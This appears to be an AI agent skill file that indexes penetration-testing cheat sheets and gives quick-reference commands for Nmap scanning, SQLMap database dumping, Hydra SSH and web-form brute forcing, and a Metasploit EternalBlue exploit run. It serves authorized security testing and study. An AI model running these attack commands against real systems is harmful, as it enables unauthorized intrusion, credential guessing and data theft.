---
name: SecOps-CLI-Guides
description: Security operations CLI cheat sheets and guides for penetration testing, Linux administration, network scanning, exploitation, and privilege escalation. Use when needing reference commands for Nmap, SQLMap, Hydra, Metasploit, Wireshark, PowerShell scripting, or Linux privilege escalation techniques.
---

# SecOps CLI Guides

A curated collection of penetration testing and Linux administration command reference guides for security professionals.

## Repository

Full source: `skills/SecOps-CLI-Guides/` (cloned from https://github.com/zebbern/SecOps-CLI-Guides)

## Available Skills

### Exploitation & Penetration
| Skill | Description |
|-------|-------------|
| `metasploit-framework` | Metasploit exploitation, payloads, post-exploitation |
| `buffer-overflow-exploitation` | Buffer overflow techniques and exploit development |
| `sqlmap-database-pentesting` | SQL injection and database exploitation |
| `sql-injection-testing` | SQL injection testing methodology |
| `xss-html-injection` | Cross-site scripting and HTML injection |
| `csrf-testing` | Cross-site request forgery testing |
| `ldap-injection` | LDAP injection attacks |
| `file-path-traversal` | Directory traversal and path manipulation |
| `idor-testing` | Insecure direct object reference testing |
| `jwt-security-testing` | JWT token analysis and attacks |
| `broken-authentication` | Authentication bypass techniques |
| `session-security-testing` | Session management vulnerabilities |
| `html-injection-testing` | HTML injection testing |

### Network & Scanning
| Skill | Description |
|-------|-------------|
| `scanning-tools` | Nmap, masscan, and network scanning |
| `network-101` | Network fundamentals |
| `network-ports-reference` | Common ports and services |
| `networking-essentials` | Networking concepts |
| `bgp-routing-protocol` | BGP protocol analysis |
| `ssh-penetration-testing` | SSH attack techniques |
| `ssh-key-authentication` | SSH key-based authentication |
| `smtp-penetration-testing` | SMTP enumeration and attacks |
| `wifi-penetration-testing` | Wireless network attacks |

### Linux & Privilege Escalation
| Skill | Description |
|-------|-------------|
| `linux-pentesting-fundamentals` | Linux pentesting basics |
| `linux-privilege-escalation` | Linux privilege escalation techniques |
| `linux-commands` | Essential Linux commands |
| `linux-shell-scripting` | Bash scripting for security |
| `privilege-escalation-methods` | General privilege escalation methods |
| `john-the-ripper` | Password cracking with John |

### Windows & Active Directory
| Skill | Description |
|-------|-------------|
| `active-directory-attacks` | AD enumeration and exploitation |
| `windows-privilege-escalation` | Windows privilege escalation |
| `powershell-scripting` | PowerShell for security testing |

### Web Application Security
| Skill | Description |
|-------|-------------|
| `burp-suite-testing` | Burp Suite web testing |
| `top-web-vulnerabilities` | OWASP Top 10 reference |
| `wordpress-penetration-testing` | WordPress security testing |
| `api-fuzzing-bug-bounty` | API fuzzing and bug bounty |
| `phishing-attacks` | Phishing attack techniques |
| `ddos-attack-testing` | DDoS testing methodology |

### Cloud & Infrastructure
| Skill | Description |
|-------|-------------|
| `cloud-penetration-testing` | Cloud environment pentesting |
| `aws-penetration-testing` | AWS-specific attacks |
| `shodan-reconnaissance` | Shodan OSINT and reconnaissance |

### Tools & Methodology
| Skill | Description |
|-------|-------------|
| `red-team-tools` | Red team tool collection |
| `ethical-hacking-methodology` | Ethical hacking methodology |
| `oscp-cheat-sheet` | OSCP exam cheat sheet |
| `oscp-methodology` | OSCP-style methodology |
| `oscp-notes` | OSCP study notes |
| `pentest-checklist` | Penetration testing checklist |
| `pentest-commands` | Quick pentest command reference |
| `pentesting-beginner-to-advanced` | Pentesting progression guide |
| `quick-pentest-reference` | Quick reference guide |
| `hacking-fundamentals` | Hacking basics |
| `mobile-security-testing` | Mobile application security |
| `external-network-pentesting` | External network testing |
| `credential-harvesting-lab` | Credential harvesting lab setup |
| `wireshark-analysis` | Wireshark packet analysis |

## Quick Reference

### Nmap
```bash
nmap -sV -sC -O target          # Version detection + default scripts + OS
nmap -A -T4 target              # Aggressive scan
nmap -p- target                 # All ports
nmap --script vuln target       # Vulnerability scan
```

### SQLMap
```bash
sqlmap -u "http://target/?id=1" --dbs    # Enumerate databases
sqlmap -u "http://target/?id=1" -D db --tables  # Enumerate tables
sqlmap -u "http://target/?id=1" -D db -T table --dump  # Dump data
```

### Hydra
```bash
hydra -l user -P wordlist.txt target ssh       # SSH brute force
hydra -l admin -P wordlist.txt target http-post-form  # HTTP form
```

### Metasploit
```bash
msfconsole -q                                    # Quiet start
search eternalblue                               # Search modules
use exploit/windows/smb/ms17_010_eternalblue     # Select exploit
set RHOSTS target                                # Set target
exploit                                          # Execute
```

## Disclaimer

These guides are for authorized security testing and educational purposes only. Always obtain proper authorization before testing.
